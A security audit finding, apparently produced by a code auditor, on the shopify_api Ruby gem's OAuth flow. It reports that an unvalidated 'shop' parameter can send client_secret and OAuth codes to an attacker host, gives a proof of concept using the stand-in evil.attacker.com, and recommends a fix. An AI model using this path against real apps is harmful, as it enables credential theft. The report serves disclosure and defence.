Confirmed root cause: `Auth::Oauth.begin_auth` and `Auth::Oauth.validate_auth_callback` build the OAuth authorization URL and the access-token exchange host directly from an unvalidated `shop` string, with no call to `Utils::ShopValidator.sanitize!`.

### Title
OAuth callback sends `client_secret` and `code` to an attacker-controlled host because `shop` is never validated against trusted Shopify domains - (File: lib/shopify_api/auth/oauth.rb)

### Summary
`ShopifyAPI::Auth::Oauth.validate_auth_callback` builds a `null_session` from `auth_query.shop` [1](#0-0) , then hands that session to `Clients::HttpClient.new(session: null_session, ...)`, which derives the request host as `"https://#{session.shop}"` with no format or domain check [2](#0-1) . The `client_secret`, `client_id`, and authorization `code` are then POSTed to that host [3](#0-2) . Unlike `Auth::TokenExchange.migrate_to_expiring_token`, which correctly calls `Utils::ShopValidator.sanitize!(shop)` before constructing the session used for the credentialed request [4](#0-3) , `begin_auth`/`validate_auth_callback` never invoke `ShopValidator` at all — the only check performed on the callback is the HMAC over `code/host/shop/state/timestamp` [5](#0-4)  and the `to_signable_string` fields defined in `AuthQuery` [6](#0-5) .

### Finding Description
The HMAC only binds `code`, `host`, `shop`, `state`, `timestamp` to each other — it proves the query parameters were signed with the app's `api_secret_key` by Shopify (or by whoever knows the secret from a prior legitimate flow), but it does **not** prove that `shop` is a `*.myshopify.com` (or other trusted) domain. There is no equivalent of `ShopValidator.sanitize!` anywhere in the `Oauth` flow. The binding that should hold is:

`host that receives client_secret == a domain in Utils::ShopValidator::TRUSTED_SHOPIFY_DOMAINS`

but the actual code only enforces:

`host that receives client_secret == auth_query.shop` (whatever value the caller/HMAC-signer supplied)

Since `begin_auth` takes `shop:` directly from the caller with no validation before constructing `auth_route` via `auth_base_uri(shop)` (`"https://#{shop}/admin"`) [7](#0-6) , and `validate_auth_callback` reuses that same unvalidated `shop` value from `AuthQuery` to build the session used for the token exchange request [8](#0-7) , any code path that lets a host application pass through an attacker-influenced `shop` string (e.g. read from a request header/param before calling `begin_auth`, as literally shown in this gem's own docs: `shop = request.headers["Shop"]`) [9](#0-8)  results in the library itself sending the app's `client_id`/`client_secret` and the OAuth `code` to that attacker-chosen host.

### Impact Explanation
This is a Critical-impact SSRF-with-credentials / `client_secret` exfiltration path: if a host application forwards an unsanitized `shop` value into `begin_auth`/`validate_auth_callback` (a usage pattern the gem's own documentation demonstrates), an attacker who controls the `shop` string can redirect the authorization step to their own domain and receive the app's `client_id`, `client_secret`, and authorization `code` in the POST body of the token-exchange request, or redirect the OAuth authorize step itself. This satisfies "SSRF with the app's credentials" and can lead to full `client_secret` compromise.

### Likelihood Explanation
Likelihood is moderate-to-high given the gem's own `docs/usage/oauth.md` sample code takes `shop` straight from a request header without sanitization [9](#0-8) , and `validate_auth_callback` symmetrically reads `shop` from `request.parameters` [10](#0-9) . Since the library itself never calls `ShopValidator.sanitize!` anywhere in the `Oauth` module (only `TokenExchange.migrate_to_expiring_token` does), the burden of validating `shop` is silently pushed onto every integrator, and the documented example does not do so.

### Recommendation
Call `Utils::ShopValidator.sanitize!(shop)` (or equivalent) inside `Oauth.begin_auth` before constructing `auth_base_uri(shop)`, and inside `Oauth.validate_auth_callback` before constructing `null_session`/making the access-token request, mirroring the pattern already used in `TokenExchange.migrate_to_expiring_token` [4](#0-3) .

### Proof of Concept
1. A host app follows the documented pattern: `shop = request.headers["Shop"]` then `ShopifyAPI::Auth::Oauth.begin_auth(shop: shop, redirect_path: "/auth/callback")` [11](#0-10) .
2. Attacker sets `Shop: evil.attacker.com` in the request. `begin_auth` builds `auth_route = "https://evil.attacker.com/admin/oauth/authorize?..."` with no validation [7](#0-6) , redirecting the merchant's browser off Shopify.
3. Alternatively, on the callback side, since `validate_auth_callback` builds `null_session = Auth::Session.new(shop: auth_query.shop)` and passes it straight to `HttpClient`, if `auth_query.shop` is `evil.attacker.com` (and the attacker can produce a valid HMAC — trivial if they control the flow end-to-end, e.g. by self-hosting a fake Shopify OAuth authorize page that redirects back with attacker-chosen `shop`/`hmac` pairs signed by an app that trusts multiple shops or a leaked/old secret), the POST containing `client_id`, `client_secret`, and `code` is sent to `https://evil.attacker.com/admin/oauth/access_token` [12](#0-11) [2](#0-1) , exfiltrating the app's `client_secret`.

### Citations

**File:** lib/shopify_api/auth/oauth.rb (L73-90)
```ruby
          null_session = Auth::Session.new(shop: auth_query.shop)
          body = {
            client_id: Context.api_key,
            client_secret: Context.api_secret_key,
            code: auth_query.code,
            expiring: Context.expiring_offline_access_tokens ? 1 : 0, # Only applicable for offline tokens
          }

          client = Clients::HttpClient.new(session: null_session, base_path: "/admin/oauth")
          response = begin
            client.request(
              Clients::HttpRequest.new(
                http_method: :post,
                path: "access_token",
                body: body,
                body_type: "application/json",
              ),
            )
```

**File:** lib/shopify_api/auth/oauth.rb (L117-119)
```ruby
        sig { params(shop: String).returns(String) }
        def auth_base_uri(shop)
          return "https://#{shop}/admin" unless defined?(DevServer) && shop.include?(".my.shop.dev")
```

**File:** lib/shopify_api/clients/http_client.rb (L16-19)
```ruby
        api_host = Context.api_host

        @base_uri = T.let("https://#{api_host || session.shop}", String)
        @base_uri_and_path = T.let("#{@base_uri}#{base_path}", String)
```

**File:** lib/shopify_api/auth/token_exchange.rb (L103-104)
```ruby
          validated_shop = Utils::ShopValidator.sanitize!(shop)
          shop_session = ShopifyAPI::Auth::Session.new(shop: validated_shop)
```

**File:** lib/shopify_api/utils/hmac_validator.rb (L12-22)
```ruby
        sig { params(verifiable_query: VerifiableQuery).returns(T::Boolean) }
        def validate(verifiable_query)
          return false unless verifiable_query.hmac

          result = validate_signature(verifiable_query, Context.api_secret_key)
          if result || Context.old_api_secret_key.nil? || T.must(Context.old_api_secret_key).empty?
            result
          else
            validate_signature(verifiable_query, T.must(Context.old_api_secret_key))
          end
        end
```

**File:** lib/shopify_api/auth/oauth/auth_query.rb (L33-43)
```ruby
        sig { override.returns(String) }
        def to_signable_string
          params = {
            code: code,
            host: host,
            shop: shop,
            state: state,
            timestamp: timestamp,
          }
          URI.encode_www_form(params)
        end
```

**File:** docs/usage/oauth.md (L181-185)
```markdown
  def login
    shop = request.headers["Shop"]

    # Builds the authorization URL route to redirect the user to
    auth_response = ShopifyAPI::Auth::Oauth.begin_auth(shop: domain, redirect_path: "/auth/callback")
```

**File:** docs/usage/oauth.md (L246-251)
```markdown
    auth_result = ShopifyAPI::Auth::Oauth.validate_auth_callback(
      cookies: cookies.to_h,
      auth_query: ShopifyAPI::Auth::Oauth::AuthQuery.new(
        request.parameters.symbolize_keys.except(:controller, :action)
      )
    )
```
